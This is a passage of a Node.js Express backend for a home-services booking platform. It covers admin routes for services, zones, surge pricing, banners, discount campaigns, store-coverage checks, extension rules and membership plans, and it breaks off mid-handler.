// Worker/customer ETA via OSRM road routing (free). Distance Matrix (Google) can slot in later
// when billing is enabled. Returns straight road distance + drive-time estimate.
app.get('/api/eta', async (req, res) => {
  const fromLat = Number(req.query.fromLat), fromLng = Number(req.query.fromLng)
  const toLat = Number(req.query.toLat), toLng = Number(req.query.toLng)
  if ([fromLat, fromLng, toLat, toLng].some(Number.isNaN)) return res.status(400).json({ error: 'from/to lat & lng required' })
  try {
    const url = `https://router.project-osrm.org/route/v1/driving/${fromLng},${fromLat};${toLng},${toLat}?overview=false`
    const r0 = (await (await fetch(url)).json())?.routes?.[0]
    if (!r0) return res.status(502).json({ error: 'No route' })
    res.json({ provider: 'osrm', distanceKm: +(r0.distance / 1000).toFixed(2), etaMin: Math.max(1, Math.round(r0.duration / 60)) })
  } catch (e) { console.error('[catalog] eta:', e.message); res.status(502).json({ error: 'ETA failed' }) }
})

/* ---------- internal (service-to-service) ---------- */
// Booking service prices bookings authoritatively through here (body may carry `customerId` so
// per-customer campaign eligibility resolves).
app.post('/api/internal/price', internalOnly, async (req, res) => { const r = await quote(req.body || {}); res.status(r.status).json(r.body) })
// Booking service records campaign redemptions here after a booking is created.
app.post('/api/internal/campaign-usage', internalOnly, async (req, res) => {
  const b = req.body || {}
  await recordUsage(pool, {
    customerId: Number(b.customerId) || null, bookingId: Number(b.bookingId) || null,
    campaignIds: Array.isArray(b.campaignIds) ? b.campaignIds : [], couponCode: b.couponCode || null,
  })
  res.json({ ok: true })
})

/* ---------- admin management ---------- */
app.get('/api/admin/services', adminAuth, async (_q, res) => {
  const [rows, counts] = await Promise.all([allServices(), bookingCounts()])
  res.json(rows.map((s) => ({ ...s, bookings: counts[s.id] || 0 })))
})
app.post('/api/admin/services', adminAuth, requirePerm('services.create'), async (req, res) => {
  const b = req.body || {}
  const id = String(b.id || b.name || '').toLowerCase().replace(/[^a-z0-9]+/g, '').slice(0, 24)
  if (!id || !b.name) return res.status(400).json({ error: 'Name is required' })
  const exists = await pool.query('SELECT 1 FROM services WHERE id=$1', [id])
  if (exists.rowCount) return res.status(409).json({ error: 'Service already exists' })
  const { rows } = await pool.query('SELECT COALESCE(MAX(sort),0)+1 AS s FROM services')
  await pool.query('INSERT INTO services (id,name,icon,price,category,available,sort,duration_min,gst_pct) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)',
    [id, b.name, b.icon || '🧰', Math.max(0, Number(b.price) || 99), b.category || 'Cleaning', b.available === false ? false : true, rows[0].s, Math.max(5, Number(b.duration_min) || durationMinFor(id)), b.gst_pct != null ? Math.max(0, Number(b.gst_pct)) : 18])
  await broadcastServices()
  res.status(201).json({ ok: true, id })
})
app.patch('/api/admin/services/:id', adminAuth, requirePerm('services.edit'), async (req, res) => {
  const b = req.body || {}
  const cur = await pool.query('SELECT * FROM services WHERE id=$1', [req.params.id])
  if (!cur.rowCount) return res.status(404).json({ error: 'Not found' })
  const s = cur.rows[0]
  await pool.query('UPDATE services SET name=$1, icon=$2, price=$3, category=$4, available=$5, duration_min=COALESCE($6,duration_min), gst_pct=COALESCE($7,gst_pct) WHERE id=$8', [
    b.name ?? s.name, b.icon ?? s.icon, b.price ?? s.price, b.category ?? s.category,
    b.available === undefined ? s.available : !!b.available, b.duration_min ?? null, b.gst_pct ?? null, req.params.id,
  ])
  await broadcastServices()
  res.json({ ok: true })
})
app.delete('/api/admin/services/:id', adminAuth, requirePerm('services.delete'), async (req, res) => {
  await pool.query('DELETE FROM services WHERE id=$1', [req.params.id])
  await broadcastServices()
  res.json({ ok: true })
})
/* ---------- admin: Service Zones (area-by-area onboarding) ---------- */
const zoneOut = (z) => ({ ...z, config: z.config || {}, pincodeList: normPins(z.pincodes), pincodeCount: normPins(z.pincodes).length })
app.get('/api/admin/zones', adminAuth, async (_q, res) => {
  const { rows } = await pool.query('SELECT * FROM zones ORDER BY state, city, name')
  res.json(rows.map(zoneOut))
})

/* ---------- surge pricing (weather-driven + ops override) ---------- */
// Current surge per live zone: the weather signal, the derived %, and whether it's automatic or a
// manual override. Enriched with the zone name for display.
app.get('/api/admin/surge', adminAuth, async (_q, res) => {
  const snap = surgeSnapshot()
  const names = new Map((await pool.query('SELECT id, name FROM zones')).rows.map((r) => [r.id, r.name]))
  res.json(snap.map((s) => ({ ...s, zone: names.get(s.zoneId) || `Zone ${s.zoneId}` })).sort((a, b) => (b.pct - a.pct) || a.zone.localeCompare(b.zone)))
})
// Ops override: force a surge % on a zone (or "all") for N minutes; pct 0 clears it. Takes precedence
// over the automatic weather surge until it expires.
app.post('/api/admin/surge', adminAuth, requirePerm('pricing.edit'), async (req, res) => {
  const b = req.body || {}
  const scope = b.zoneId === 'all' || b.zoneId === '*' ? '*' : Number(b.zoneId)
  if (scope !== '*' && !Number.isFinite(scope)) return res.status(400).json({ error: 'zoneId (a zone id or "all") is required' })
  const pct = Math.max(0, Math.min(50, Number(b.pct) || 0))
  const minutes = b.minutes != null ? Math.max(0, Number(b.minutes)) : 120
  setManualSurge(scope, pct, minutes)
  res.json({ ok: true, scope: scope === '*' ? 'all' : scope, pct, minutes })
})

/* ---------- admin: Home hero banners (festival / promo scheduling) ---------- */
const HB_COLS = ['title', 'subtitle', 'emoji', 'theme', 'cta_label', 'cta_link', 'starts', 'ends', 'zone_id', 'priority', 'status', 'kind', 'image_url']
const hbDefaults = { subtitle: '', emoji: '', theme: 'purple', cta_label: '', cta_link: '', starts: null, ends: null, zone_id: null, priority: 50, status: 'active', kind: 'festival', image_url: '' }
// Upload a banner background image → public media bucket. Returns a gateway-relative URL the phone
// can load (streamed back through /api/banner-media, since MinIO itself isn't reachable off-host).
app.post('/api/admin/banners/image', adminAuth, requirePerm('campaigns.edit'), upload.single('file'), async (req, res) => {
  if (!storageConfigured()) return res.status(503).json({ error: 'Image storage is not configured' })
  if (!req.file) return res.status(400).json({ error: 'No image uploaded' })
  const kind = sniffType(req.file.buffer)
  if (!kind || !kind.mime.startsWith('image/')) return res.status(400).json({ error: 'Please upload a JPG, PNG or WebP image' })
  const key = storageKey('banners', kind.ext)
  try { await putPublicObject(key, req.file.buffer, kind.mime) }
  catch (e) { return res.status(502).json({ error: 'Upload failed: ' + e.message }) }
  res.status(201).json({ url: `/api/banner-media/${key}` })
})
const hbClean = (b) => ({ ...b, zone_id: b.zone_id === '' || b.zone_id == null ? null : Number(b.zone_id), starts: b.starts || null, ends: b.ends || null })
app.get('/api/admin/banners', adminAuth, async (_q, res) => {
  const { rows } = await pool.query('SELECT * FROM home_banners ORDER BY priority DESC, id DESC')
  res.json(rows)
})
app.post('/api/admin/banners', adminAuth, requirePerm('campaigns.create'), async (req, res) => {
  const b = hbClean(req.body || {})
  if (!b.title || !String(b.title).trim()) return res.status(400).json({ error: 'Title is required' })
  const vals = HB_COLS.map((c) => (b[c] !== undefined ? b[c] : hbDefaults[c]))
  const ph = HB_COLS.map((_, i) => `$${i + 1}`).join(',')
  const { rows } = await pool.query(`INSERT INTO home_banners (${HB_COLS.join(',')}) VALUES (${ph}) RETURNING id`, vals)
  res.status(201).json({ ok: true, id: rows[0].id })
})
app.patch('/api/admin/banners/:id', adminAuth, requirePerm('campaigns.edit'), async (req, res) => {
  const id = Number(req.params.id), b = hbClean(req.body || {})
  if (!(await pool.query('SELECT 1 FROM home_banners WHERE id=$1', [id])).rowCount) return res.status(404).json({ error: 'Banner not found' })
  const cols = HB_COLS.filter((c) => b[c] !== undefined)
  if (cols.length) {
    const set = cols.map((c, i) => `${c}=$${i + 1}`).join(',')
    await pool.query(`UPDATE home_banners SET ${set} WHERE id=$${cols.length + 1}`, [...cols.map((c) => b[c]), id])
  }
  res.json({ ok: true })
})
app.delete('/api/admin/banners/:id', adminAuth, requirePerm('campaigns.delete'), async (req, res) => {
  await pool.query('DELETE FROM home_banners WHERE id=$1', [Number(req.params.id)])
  res.json({ ok: true })
})
app.post('/api/admin/zones', adminAuth, requirePerm('zones.edit'), async (req, res) => {
  const b = req.body || {}
  if (!b.name || !String(b.name).trim()) return res.status(400).json({ error: 'Zone name is required' })
  const status = ['planned', 'live', 'paused'].includes(b.status) ? b.status : 'planned'
  const { rows } = await pool.query(
    'INSERT INTO zones (name,state,city,pincodes,status,sla_minutes,code,config) VALUES ($1,$2,$3,$4,$5,$6,$7,$8::jsonb) RETURNING *',
    [String(b.name).trim(), String(b.state || '').trim(), String(b.city || '').trim(), normPins(b.pincodes).join(','), status,
      b.slaMinutes ? Number(b.slaMinutes) : null, b.code ? String(b.code).trim() : null, JSON.stringify(b.config || {})])
  await syncZonePricing(rows[0].id, b.config || {})
  res.status(201).json(zoneOut(rows[0]))
})
app.patch('/api/admin/zones/:id', adminAuth, requirePerm('zones.edit'), async (req, res) => {
  const cur = await pool.query('SELECT * FROM zones WHERE id=$1', [req.params.id])
  if (!cur.rowCount) return res.status(404).json({ error: 'Zone not found' })
  const z = cur.rows[0], b = req.body || {}
  await pool.query('UPDATE zones SET name=$1,state=$2,city=$3,pincodes=$4,status=$5,sla_minutes=$6,code=$7,config=$8::jsonb WHERE id=$9', [
    b.name ?? z.name, b.state ?? z.state, b.city ?? z.city,
    b.pincodes !== undefined ? normPins(b.pincodes).join(',') : z.pincodes,
    b.status && ['planned', 'live', 'paused'].includes(b.status) ? b.status : z.status,
    b.slaMinutes !== undefined ? (b.slaMinutes ? Number(b.slaMinutes) : null) : z.sla_minutes,
    b.code !== undefined ? (b.code ? String(b.code).trim() : null) : z.code,
    b.config !== undefined ? JSON.stringify(b.config) : JSON.stringify(z.config || {}), req.params.id])
  await syncZonePricing(Number(req.params.id), b.config !== undefined ? b.config : (z.config || {}))
  res.json(zoneOut((await pool.query('SELECT * FROM zones WHERE id=$1', [req.params.id])).rows[0]))
})
app.delete('/api/admin/zones/:id', adminAuth, requirePerm('zones.edit'), async (req, res) => {
  await pool.query('DELETE FROM zones WHERE id=$1', [req.params.id])
  res.json({ ok: true })
})

/* ───────── Admin: Campaigns (Dynamic Pricing Engine) ─────────
   One handler owns campaign_master + its children (campaign_zone / campaign_customer_rule / coupon).
   `zoneIds` empty = all zones; `rule` set for customer campaigns; `coupon` set for coupon campaigns. */
const CM_COLS = ['campaign_name', 'campaign_type', 'discount_type', 'discount_value', 'max_discount',
  'min_subtotal', 'service_id', 'category', 'duration_id', 'priority', 'stackable', 'starts', 'ends',
  'status', 'banner_title', 'banner_subtitle']
const cmDefaults = { campaign_type: 'zone', discount_type: 'flat', discount_value: 0, max_discount: 0, min_subtotal: 0, service_id: '', category: '', duration_id: '', priority: 2, stackable: false, starts: null, ends: null, status: 'active', banner_title: '', banner_subtitle: '' }

async function syncCampaignChildren(id, b) {
  if (b.zoneIds !== undefined) {
    await pool.query('DELETE FROM campaign_zone WHERE campaign_id=$1', [id])
    for (const z of (Array.isArray(b.zoneIds) ? b.zoneIds : [])) {
      if (Number.isFinite(Number(z))) await pool.query('INSERT INTO campaign_zone (campaign_id,zone_id) VALUES ($1,$2) ON CONFLICT DO NOTHING', [id, Number(z)])
    }
  }
  if (b.rule !== undefined) {
    await pool.query('DELETE FROM campaign_customer_rule WHERE campaign_id=$1', [id])
    const r = b.rule || {}
    if (r.segment) await pool.query(
      'INSERT INTO campaign_customer_rule (campaign_id,segment,max_usage,winback_days,vip_min_orders) VALUES ($1,$2,$3,$4,$5)',
      [id, r.segment, Number(r.max_usage) || 0, Number(r.winback_days) || 30, Number(r.vip_min_orders) || 10])
  }
  if (b.coupon !== undefined) {
    await pool.query('DELETE FROM coupon WHERE campaign_id=$1', [id])
    const c = b.coupon || {}
    if (c.coupon_code) await pool.query(
      'INSERT INTO coupon (coupon_code,campaign_id,auto_apply,expiry,usage_limit) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (coupon_code) DO UPDATE SET campaign_id=EXCLUDED.campaign_id,auto_apply=EXCLUDED.auto_apply,expiry=EXCLUDED.expiry,usage_limit=EXCLUDED.usage_limit',
      [String(c.coupon_code).trim().toUpperCase(), id, !!c.auto_apply, c.expiry || null, Number(c.usage_limit) || 0])
  }
}

app.get('/api/admin/campaigns', adminAuth, async (_q, res) => {
  const { rows } = await pool.query('SELECT * FROM campaign_master ORDER BY priority, campaign_id')
  const ids = rows.map((r) => r.campaign_id)
  if (!ids.length) return res.json([])
  const [zones, rules, coupons, usage] = await Promise.all([
    pool.query('SELECT campaign_id, zone_id FROM campaign_zone WHERE campaign_id = ANY($1)', [ids]),
    pool.query('SELECT * FROM campaign_customer_rule WHERE campaign_id = ANY($1)', [ids]),
    pool.query('SELECT * FROM coupon WHERE campaign_id = ANY($1)', [ids]),
    pool.query('SELECT campaign_id, COUNT(*)::int n FROM customer_campaign_usage WHERE campaign_id = ANY($1) GROUP BY campaign_id', [ids]),
  ])
  const zBy = {}; for (const z of zones.rows) (zBy[z.campaign_id] ||= []).push(z.zone_id)
  const rBy = Object.fromEntries(rules.rows.map((r) => [r.campaign_id, r]))
  const cBy = Object.fromEntries(coupons.rows.map((c) => [c.campaign_id, c]))
  const uBy = Object.fromEntries(usage.rows.map((u) => [u.campaign_id, u.n]))
  res.json(rows.map((m) => ({ ...m, zoneIds: zBy[m.campaign_id] || [], rule: rBy[m.campaign_id] || null, coupon: cBy[m.campaign_id] || null, usedCount: uBy[m.campaign_id] || 0 })))
})
app.post('/api/admin/campaigns', adminAuth, requirePerm('campaigns.create'), async (req, res) => {
  const b = req.body || {}
  if (!b.campaign_name || !String(b.campaign_name).trim()) return res.status(400).json({ error: 'Campaign name is required' })
  if (!['zone', 'customer', 'coupon'].includes(b.campaign_type)) return res.status(400).json({ error: 'Invalid campaign type' })
  const vals = CM_COLS.map((c) => (b[c] !== undefined ? b[c] : cmDefaults[c]))
  const ph = CM_COLS.map((_, i) => `$${i + 1}`).join(',')
  const { rows } = await pool.query(`INSERT INTO campaign_master (${CM_COLS.join(',')}) VALUES (${ph}) RETURNING campaign_id`, vals)
  const id = rows[0].campaign_id
  await syncCampaignChildren(id, b)
  res.status(201).json({ ok: true, campaign_id: id })
})
app.patch('/api/admin/campaigns/:id', adminAuth, requirePerm('campaigns.edit'), async (req, res) => {
  const id = intId(req, res); if (id === null) return
  const b = req.body || {}
  const cur = (await pool.query('SELECT 1 FROM campaign_master WHERE campaign_id=$1', [id])).rows[0]
  if (!cur) return res.status(404).json({ error: 'Campaign not found' })
  const cols = CM_COLS.filter((c) => b[c] !== undefined)
  if (cols.length) {
    const set = cols.map((c, i) => `${c}=$${i + 1}`).join(',')
    await pool.query(`UPDATE campaign_master SET ${set} WHERE campaign_id=$${cols.length + 1}`, [...cols.map((c) => b[c]), id])
  }
  await syncCampaignChildren(id, b)
  res.json({ ok: true })
})
app.delete('/api/admin/campaigns/:id', adminAuth, requirePerm('campaigns.delete'), async (req, res) => {
  const id = intId(req, res); if (id === null) return
  await pool.query('DELETE FROM campaign_zone WHERE campaign_id=$1', [id])
  await pool.query('DELETE FROM campaign_customer_rule WHERE campaign_id=$1', [id])
  await pool.query('DELETE FROM coupon WHERE campaign_id=$1', [id])
  await pool.query('DELETE FROM campaign_master WHERE campaign_id=$1', [id])
  res.json({ ok: true })
})
app.get('/api/admin/campaigns/:id/usage', adminAuth, async (req, res) => {
  const id = intId(req, res); if (id === null) return
  const [total, recent] = await Promise.all([
    pool.query('SELECT COUNT(*)::int n, COUNT(DISTINCT customer_id)::int customers FROM customer_campaign_usage WHERE campaign_id=$1', [id]),
    pool.query('SELECT customer_id, booking_id, created FROM customer_campaign_usage WHERE campaign_id=$1 ORDER BY created DESC LIMIT 50', [id]),
  ])
  res.json({ total: total.rows[0].n, customers: total.rows[0].customers, recent: recent.rows })
})

/* ───────── Stores (dark-stores) with a coverage / overlap guard ─────────
   A store is a service point: a lat/lng centre + a service radius. Two stores "overlap" when the
   distance between centres < sum of radii; a point is "already covered" when it sits inside an
   existing store's radius. Creating a covered/overlapping store is blocked unless the caller is a
   super-admin passing `override: true`. */
const R_EARTH_KM = 6371
const haversineKm = (aLat, aLng, bLat, bLng) => {
  const toRad = (d) => (d * Math.PI) / 180
  const dLat = toRad(bLat - aLat), dLng = toRad(bLng - aLng)
  const s = Math.sin(dLat / 2) ** 2 + Math.cos(toRad(aLat)) * Math.cos(toRad(bLat)) * Math.sin(dLng / 2) ** 2
  return 2 * R_EARTH_KM * Math.asin(Math.min(1, Math.sqrt(s)))
}
// Area (km²) of the lens where two circles (radii r,R, centres d apart) overlap.
const overlapAreaKm2 = (d, r, R) => {
  if (d >= r + R) return 0
  if (d <= Math.abs(R - r)) return Math.PI * Math.min(r, R) ** 2
  const r2 = r * r, R2 = R * R, d2 = d * d
  const a1 = r2 * Math.acos((d2 + r2 - R2) / (2 * d * r))
  const a2 = R2 * Math.acos((d2 + R2 - r2) / (2 * d * R))
  const a3 = 0.5 * Math.sqrt(Math.max(0, (-d + r + R) * (d + r - R) * (d - r + R) * (d + r + R)))
  return a1 + a2 - a3
}
async function analyseStore(lat, lng, radiusKm, excludeId = null) {
  const { rows } = await pool.query('SELECT id,name,manager,lat,lng,radius_km,status,pincode FROM stores WHERE lat IS NOT NULL AND lng IS NOT NULL')
  const nearby = [], coveredBy = [], overlaps = []
  for (const s of rows) {
    if (excludeId && s.id === Number(excludeId)) continue
    const dist = haversineKm(lat, lng, s.lat, s.lng)
    const row = { id: s.id, name: s.name, manager: s.manager, lat: s.lat, lng: s.lng, radiusKm: s.radius_km, status: s.status, distanceKm: Math.round(dist * 100) / 100 }
    nearby.push(row)
    if (dist <= s.radius_km) coveredBy.push(row)                                  // centre inside their coverage
    if (radiusKm > 0 && dist < s.radius_km + radiusKm)                            // service circles overlap
      overlaps.push({ ...row, overlapAreaKm2: Math.round(overlapAreaKm2(dist, radiusKm, s.radius_km) * 100) / 100 })
  }
  nearby.sort((a, b) => a.distanceKm - b.distanceKm)
  return { nearby, coveredBy, overlaps }
}

/** One store's location, for dispatch's per-worker job radius (measured from the worker's store). */
app.get('/api/internal/stores/:id', internalOnly, async (req, res) => {
  const { rows } = await pool.query('SELECT id, name, zone_id, lat, lng, radius_km, status FROM stores WHERE id=$1', [Number(req.params.id)])
  if (!rows.length) return res.status(404).json({ error: 'Store not found' })
  res.json(rows[0])
})

app.get('/api/admin/stores', adminAuth, async (req, res) => {
  const zone = req.query.zone_id ? Number(req.query.zone_id) : null
  const { rows } = zone != null
    ? await pool.query('SELECT * FROM stores WHERE zone_id=$1 ORDER BY id', [zone])
    : await pool.query('SELECT * FROM stores ORDER BY id')
  res.json(rows)
})
// Coverage/overlap preview for a candidate centre — the wizard calls this before creating.
// Overriding a store-coverage overlap is a privileged action — super, or any role granted the
// explicit zones.stores_override permission.
const canOverrideStore = (req) => req.admin?.role === 'super' || (req.admin?.permissions || []).includes('zones.stores_override')
app.get('/api/admin/stores/check', adminAuth, async (req, res) => {
  const lat = Number(req.query.lat), lng = Number(req.query.lng), radiusKm = Number(req.query.radiusKm) || 0
  if (!isFinite(lat) || !isFinite(lng)) return res.status(400).json({ error: 'lat/lng required' })
  const a = await analyseStore(lat, lng, radiusKm, req.query.exclude_id)
  res.json({ ...a, covered: a.coveredBy.length > 0, overlapping: a.overlaps.length > 0, canOverride: canOverrideStore(req) })
})
app.post('/api/admin/stores', adminAuth, requirePerm('zones.edit'), async (req, res) => {
  const b = req.body || {}
  if (!b.name || !String(b.name).trim()) return res.status(400).json({ error: 'Store name is required' })
  const lat = Number(b.lat), lng = Number(b.lng), radiusKm = Number(b.radius_km) || 3
  if (!isFinite(lat) || !isFinite(lng)) return res.status(400).json({ error: 'A valid location (lat/lng) is required' })
  const a = await analyseStore(lat, lng, radiusKm)
  const blocked = a.coveredBy.length > 0 || a.overlaps.length > 0
  const isSuper = canOverrideStore(req)
  if (blocked && !(isSuper && b.override)) {
    return res.status(409).json({
      error: a.coveredBy.length ? 'This location is already covered by an existing store.' : 'This store overlaps an existing store.',
      covered: a.coveredBy.length > 0, overlapping: a.overlaps.length > 0, coveredBy: a.coveredBy, overlaps: a.overlaps, canOverride: isSuper,
    })
  }
  const { rows } = await pool.query(
    `INSERT INTO stores (zone_id,name,manager,address,pincode,lat,lng,radius_km,status)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING *`,
    [b.zone_id ?? null, String(b.name).trim(), String(b.manager || '').trim(), String(b.address || '').trim(),
      String(b.pincode || '').trim(), lat, lng, radiusKm, ['active', 'paused', 'planned'].includes(b.status) ? b.status : 'active'])
  res.status(201).json({ ...rows[0], overridden: blocked })
})
app.patch('/api/admin/stores/:id', adminAuth, requirePerm('zones.edit'), async (req, res) => {
  const b = req.body || {}
  const cur = (await pool.query('SELECT * FROM stores WHERE id=$1', [Number(req.params.id)])).rows[0]
  if (!cur) return res.status(404).json({ error: 'Store not found' })
  const lat = b.lat !== undefined ? Number(b.lat) : cur.lat
  const lng = b.lng !== undefined ? Number(b.lng) : cur.lng
  const radiusKm = b.radius_km !== undefined ? Number(b.radius_km) : cur.radius_km
  if (b.lat !== undefined || b.lng !== undefined || b.radius_km !== undefined) {
    const a = await analyseStore(lat, lng, radiusKm, cur.id)
    const blocked = a.coveredBy.length > 0 || a.overlaps.length > 0
    if (blocked && !(canOverrideStore(req) && b.override))
      return res.status(409).json({ error: 'This location overlaps an existing store.', coveredBy: a.coveredBy, overlaps: a.overlaps, canOverride: canOverrideStore(req) })
  }
  const { rows } = await pool.query(
    `UPDATE stores SET name=$1,manager=$2,address=$3,pincode=$4,lat=$5,lng=$6,radius_km=$7,status=$8,zone_id=$9 WHERE id=$10 RETURNING *`,
    [b.name ?? cur.name, b.manager ?? cur.manager, b.address ?? cur.address, b.pincode ?? cur.pincode,
      lat, lng, radiusKm, b.status ?? cur.status, b.zone_id ?? cur.zone_id, cur.id])
  res.json(rows[0])
})
app.delete('/api/admin/stores/:id', adminAuth, requirePerm('zones.edit'), async (req, res) => {
  await pool.query('DELETE FROM stores WHERE id=$1', [Number(req.params.id)])
  res.json({ ok: true })
})

// Customer-facing single-field update kept from the monolith (price/availability toggle).
app.patch('/api/services/:id', adminAuth, requirePerm('services.edit'), async (req, res) => {
  const cur = await pool.query('SELECT * FROM services WHERE id=$1', [req.params.id])
  if (!cur.rowCount) return res.status(404).json({ error: 'Service not found' })
  const s = cur.rows[0]
  await pool.query('UPDATE services SET price=$1, available=$2 WHERE id=$3',
    [req.body?.price ?? s.price, req.body?.available === undefined ? s.available : !!req.body.available, req.params.id])
  await broadcastServices()
  res.json(await getService(req.params.id))
})

/* ───────── Zone-operations entities: generic real CRUD (cities / clusters / apartments / inventory / zone_pricing) ───────── */
// column allow-lists per table so we never interpolate arbitrary keys into SQL.
const ENTITY = {
  cities: { cols: ['name', 'state', 'active'], zoned: false },
  clusters: { cols: ['zone_id', 'name', 'manager', 'color', 'radius_km', 'travel_min'], zoned: true },
  apartments: { cols: ['zone_id', 'cluster_id', 'name', 'type', 'builder', 'units', 'occupied', 'pincode', 'lat', 'lng', 'aov'], zoned: true },
  inventory: { cols: ['zone_id', 'name', 'vendor', 'stock', 'reorder', 'unit'], zoned: true },
  zone_pricing: { cols: ['zone_id', 'service_id', 'price', 'discount', 'active'], zoned: true },
}
function entityRoutes(path, table, perm = 'zones.edit') {
  const def = ENTITY[table]
  app.get(`/api/admin/${path}`, adminAuth, async (req, res) => {
    const zone = req.query.zone_id ? Number(req.query.zone_id) : null
    const { rows } = zone != null && def.zoned
      ? await pool.query(`SELECT * FROM ${table} WHERE zone_id=$1 ORDER BY id`, [zone])
      : await pool.query(`SELECT * FROM ${table} ORDER BY id`)
    res.json(rows)
  })
  app.post(`/api/admin/${path}`, adminAuth, requirePerm(perm), async (req, res) => {
    const b = req.body || {}
    const cols = def.cols.filter((c) => b[c] !== undefined)
    if (!cols.length) return res.status(400).json({ error: 'No fields provided' })
    const vals = cols.map((c) => b[c])
    const ph = cols.map((_, i) => `$${i + 1}`).join(',')
    const { rows } = await pool.query(`INSERT INTO ${table} (${cols.join(',')}) VALUES (${ph}) RETURNING *`, vals)
    res.status(201).json(rows[0])
  })
  app.patch(`/api/admin/${path}/:id`, adminAuth, requirePerm(perm), async (req, res) => {
    const id = intId(req, res); if (id === null) return
    const b = req.body || {}
    const cols = def.cols.filter((c) => b[c] !== undefined)
    if (!cols.length) return res.json({ ok: true })
    const set = cols.map((c, i) => `${c}=$${i + 1}`).join(',')
    const { rows } = await pool.query(`UPDATE ${table} SET ${set} WHERE id=$${cols.length + 1} RETURNING *`, [...cols.map((c) => b[c]), id])
    if (!rows.length) return res.status(404).json({ error: 'Not found' })
    res.json(rows[0])
  })
  app.delete(`/api/admin/${path}/:id`, adminAuth, requirePerm(perm), async (req, res) => {
    const id = intId(req, res); if (id === null) return
    await pool.query(`DELETE FROM ${table} WHERE id=$1`, [id])
    res.json({ ok: true })
  })
}
entityRoutes('cities', 'cities')
entityRoutes('clusters', 'clusters')
entityRoutes('apartments', 'apartments')
entityRoutes('inventory', 'inventory')
entityRoutes('zone-pricing', 'zone_pricing', 'pricing.edit')

/* ---------- Time & Extension Rules (per service) ---------- */
// Normalised rule: only whole-minute blocks with a real price survive, ordered shortest first, so
// the apps can render the menu straight from this without re-validating.
function extRuleDto(r, service) {
  const blocks = (Array.isArray(r?.blocks) ? r.blocks : [])
    .map((b) => ({ mins: Math.round(Number(b?.mins) || 0), price: Math.round(Number(b?.price) || 0), payout: Math.round(Number(b?.payout) || 0) }))
    .filter((b) => b.mins > 0 && b.price >= 0)
    .sort((a, b) => a.mins - b.mins)
  return {
    serviceId: r.service_id, serviceName: service?.name || r.service_id,
    enabled: !!r.enabled, blocks,
    maxTotalMin: r.max_total_min, maxRequests: r.max_requests,
    minRemainingMin: r.min_remaining_min, approvalRequired: !!r.approval_required,
  }
}

app.get('/api/admin/extension-rules', adminAuth, async (_q, res) => {
  const { rows } = await pool.query(
    `SELECT r.*, s.name FROM service_extension_rules r
     LEFT JOIN services s ON s.id = r.service_id ORDER BY s.sort, r.service_id`)
  res.json(rows.map((r) => extRuleDto(r, { name: r.name })))
})

app.patch('/api/admin/extension-rules/:serviceId', adminAuth, requirePerm('pricing.edit'), async (req, res) => {
  const sid = String(req.params.serviceId)
  const b = req.body || {}
  const cur = (await pool.query('SELECT * FROM service_extension_rules WHERE service_id=$1', [sid])).rows[0]
  if (!cur) return res.status(404).json({ error: 'No such service' })
  const blocks = b.blocks !== undefined ? JSON.stringify(b.blocks) : JSON.stringify(cur.blocks)
  const { rows } = await pool.query(
    `UPDATE service_extension_rules SET enabled=$2, blocks=$3::jsonb, max_total_min=$4, max_requests=$5,
       min_remaining_min=$6, approval_required=$7, updated=now() WHERE service_id=$1 RETURNING *`,
    [sid,
      b.enabled !== undefined ? !!b.enabled : cur.enabled,
      blocks,
      b.maxTotalMin !== undefined ? Math.max(0, Number(b.maxTotalMin) || 0) : cur.max_total_min,
      b.maxRequests !== undefined ? Math.max(0, Number(b.maxRequests) || 0) : cur.max_requests,
      b.minRemainingMin !== undefined ? Math.max(0, Number(b.minRemainingMin) || 0) : cur.min_remaining_min,
      b.approvalRequired !== undefined ? !!b.approvalRequired : cur.approval_required])
  const s = (await pool.query('SELECT name FROM services WHERE id=$1', [sid])).rows[0]
  res.json(extRuleDto(rows[0], s))
})

// Booking/dispatch ask for a service's rule when pricing or gating an extension request.
app.get('/api/internal/extension-rule/:serviceId', internalOnly, async (req, res) => {
  const sid = String(req.params.serviceId)
  const r = (await pool.query('SELECT * FROM service_extension_rules WHERE service_id=$1', [sid])).rows[0]
  if (!r) return res.json(null)
  const s = (await pool.query('SELECT name FROM services WHERE id=$1', [sid])).rows[0]
  res.json(extRuleDto(r, s))
})

/* ───────── Membership plans (Module 10) — admin config authority + public catalog ─────────
   Admin edits reuse the pricing permission. Body uses snake_case column names (like campaigns);
   the three JSONB columns are stringified before write. Customer app + auth read the public list. */
const MP_COLS = ['plan_key', 'name', 'tagline', 'popular', 'price', 'features', 'discount_pct',
  'max_discount_per_order', 'discounted_orders_per_month', 'platform_fee_waiver', 'cashback_pct',
  'cashback_max', 'free_cancellations', 'priority_booking', 'min_order_value', 'eligible_services',
  'eligible_zones', 'customer_segment', 'starts_at', 'ends_at', 'status', 'sort']
const MP_JSON = new Set(['features', 'eligible_services', 'eligible_zones'])
const mpVal = (c, v) => (MP_JSON.has(c) ? JSON.stringify(v ?? []) : v)
const mpParse = (v, d) => { if (v == null) return d; if (typeof v === 'object') return v; try { return JSON.parse(v) } catch { return d } }
function membershipPlanOut(r) {
  return {
    id: r.id, key: r.plan_key, name: r.name, tagline: r.tagline, popular: r.popular, price: r.price,
    features: mpParse(r.features, []), discountPct: r.discount_pct, maxDiscountPerOrder: r.max_discount_per_order,
    discountedOrdersPerMonth: r.discounted_orders_per_month, platformFeeWaiver: r.platform_fee_waiver,
    cashbackPct: r.cashback_pct, cashbackMax: r.cashback_max, freeCancellations: r.free_cancellations,
    priorityBooking: r.priority_booking, minOrderValue: r.min_order_value,
    eligibleServices: mpParse(r.eligible_services, []), eligibleZones: mpParse(r.eligible_zones, []),
    customerSegment: r.customer_segment, startsAt: r.starts_at, endsAt: r.ends_at, status: r.status, sort: r.sort,
  }
}

app.get('/api/admin/membership-plans', adminAuth, async (_q, res) => {
  const { rows } = await pool.query('SELECT * FROM membership_plans ORDER BY sort, id')
  res.json(rows.map(membershipPlanOut))
})
app.post('/api/admin/membership-plans', adminAuth, requirePerm('pricing.edit'), async (req, res) => {
  const b = req.body || {}
  if (!b.plan_key || !String(b.plan_key).trim()) return res.status(400).json({ error: 'plan_key is required' })
  if (!b.name || !String(b.name).trim()) return res.status(400).json({ error: 'name is required' })
  const cols = MP_COLS.filter((c) => b[c] !== undefined)
  const ph = cols.map((_, i) => `$${i + 1}`).join(',')
  try {
